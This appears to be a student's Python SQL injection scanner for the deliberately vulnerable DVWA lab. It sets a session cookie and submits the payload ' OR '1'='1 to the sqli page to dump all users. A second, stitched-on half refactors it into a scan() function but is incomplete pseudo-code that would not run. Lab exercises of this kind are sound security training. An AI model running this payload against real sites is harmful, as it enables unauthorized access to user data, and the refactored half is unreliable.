import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re 

# --- CONFIGURATION ---
# IMPORTANT: Make sure this port matches the one you use in your server
BASE_URL = "http://host.docker.internal:8083" 

# --- STEP 1: PASTE YOUR COOKIE HERE ---
# Paste the 'PHPSESSID' value you copied from your browser
YOUR_COOKIE_VALUE = "8kdh3vql1a3hcjoq9qq2boc8b1"
# ---

SQLI_TEST_URL = f"{BASE_URL}/vulnerabilities/sqli/"
SQLI_PAYLOAD = "' OR '1'='1" 

# Create a session object to handle cookies
session = requests.Session()

# This header makes us look like a real browser
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

# --- THIS IS THE MANUAL COOKIE METHOD ---
session.cookies.set('security', 'low')
session.cookies.set('PHPSESSID', YOUR_COOKIE_VALUE)
print("[*] Manual cookies have been set.")
# --- END OF COOKIE METHOD ---


def test_sqli(url, payload):
    """
    Crawls the SQLI page, finds the form, and tests it.
    """
    print(f"\n[+] Testing page: {url}")
    try:
        # Use the session, which now has our cookies
        response = session.get(url) 
        
        if response.status_code != 200:
            print(f"[!] Warning: Got status code {response.status_code}")
            return
            
        # Check if we were redirected to the login page
        if "login.php" in response.url:
            print("[!] FAILED. Server redirected to login.php. Your cookie might be wrong or expired.")
            return

        print("[+] Success! Got the SQLI test page.")
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find the specific form for the SQL Injection test
        form = soup.find('form') 
        
        if form:
            print(f"  > Found the SQLI form!")
            submit_sqli(form, url, payload)
        else:
            print("[!] Could not find the form on this page.")
                
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: Could not crawl {url}. Error: {e}")

def submit_sqli(form, url, payload):
    """
    Submits the SQLI form with our payload.
    """
    action = form.get('action', '')
    target_url = urljoin(url, action) # The URL to submit to
    
    # The input field on the SQLI page is named 'id'
    # The submit button is named 'Submit'
    data_to_submit = {
        'id': payload,
        'Submit': 'Submit'
    }
            
    print(f"    [*] Submitting payload: {payload}")
    
    try:
        # This form uses the GET method
        response = session.get(target_url, params=data_to_submit)
        
        # 5. Check if the attack worked!
        # A successful 'OR '1'='1' attack will show ALL users (5 users in DVWA)
        # We can check for a user that is NOT user '1', like "admin"
        if "admin" in response.text and "First name: admin" in response.text:
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
            print(f"    [!!!] SQL VULNERABILITY FOUND [!!!]")
            print(f"    [+] Payload returned all users.")
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
        else:
            print(f"    [!] Payload did not return all users. Attack may have failed.")
            
    except requests.exceptions.RequestException as e:
        print(f"    [!] Error submitting form: {e}")


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    if YOUR_COOKIE_VALUE == "PASTE_YOUR_COOKIE_HERE":
        print("[!] ERROR: Please paste your PHPSESSID cookie into the script on line 11.")
    else:
        print(f"\n--- STARTING SQLI SCAN ON {SQLI_TEST_URL} ---")
        
        # Now that cookies are set, call test_sqli
        test_sqli(SQLI_TEST_URL, SQLI_PAYLOAD)
        
        print("\n--- CRAWL FINISHED ---")
        # week3_scanner.py

# --- We put all your imports inside the function ---
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

# This is the function week7_scanner is looking for
def scan(target_url):
    """
    Runs the SQL injection scan and returns a list of findings.
    """
    print(f"Scanning {target_url} for SQL Injection...")

    # This list will hold all the vulnerabilities you find
    findings = []

    # --- ALL YOUR ORIGINAL CODE GOES HERE, JUST INDENTED ---
    
    # -- CONFIGURATION --
    # IMPORTANT: Make sure this port matches the one you use in your server
    # Note: target_url from the function replaces your old BASE_URL
    BASE_URL = target_url 
    
    # Paste the 'PHPSESSID' value you copied from your browser
    YOUR_COOKIE_VALUE = "8kdh3vqli3hcjoqq9q2bcabi" # <-- This is from your screenshot

    SQLI_TEST_URL = f"{BASE_URL}/vulnerabilities/sqli/"
    SQLI_PAYLOAD = "' OR '1'='1"

    # Create a session object to handle cookies
    session = requests.Session()

    # --- This header makes us look like a real browser ---
    # (Your code from the screenshot continues here)
    # ...
    # ... (The rest of your code to run the scan)
    # ...

    # --- THIS IS THE IMPORTANT CHANGE ---
    # Find the part of your code where you check if a vulnerability was found.
    # Instead of just printing, do this:
    
    # PSEUDO-CODE: Replace this with your real check
    if you_find_a_vulnerability:
        print("SQL Injection vulnerability found!") # You can keep your print
        
        # Create the dictionary
        vulnerability = {
            "type": "SQL Injection",
            "endpoint": SQLI_TEST_URL, # The URL you tested
            "severity": "High",
            "mitigation": "Use parameterized queries."
        }
        # Add the dictionary to the 'findings' list
        findings.append(vulnerability)

    # At the very end of your function, return the list
    return findings


# This part goes at the VERY BOTTOM, with NO indentation.
# This lets you still run 'python week3_scanner.py' to test it.
if __name__ == "__main__":
    
    # We use your real BASE_URL here for testing
    test_url = "http://host.docker.internal:8083" 
    
    results = scan(test_url)
    
    if results:
        print("Vulnerabilities found:")
        for res in results:
            print(res)
    else:
        print("No vulnerabilities found.")